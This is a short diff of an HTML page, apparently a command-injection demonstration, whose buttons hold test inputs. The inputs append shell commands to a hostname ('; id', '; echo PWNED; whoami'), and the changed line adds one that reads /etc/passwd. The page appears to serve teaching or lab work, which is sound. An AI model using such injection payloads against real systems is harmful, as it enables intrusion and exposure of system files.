@@ -50,7 +50,7 @@
     <div class="row">
       <button data-payload="example.com">normal: example.com</button>
       <button data-payload="example.com; id">inject: ; id</button>
-      <button data-payload="example.com; id; hostname; uname -a">inject: full</button>
+      <button data-payload="example.com; id; cat /etc/passwd | head -5; uname -a">inject: passwd</button>
       <button data-payload="example.com; echo PWNED; whoami">inject: echo</button>
     </div>
     <pre id="out">$ waiting for a query…</pre>
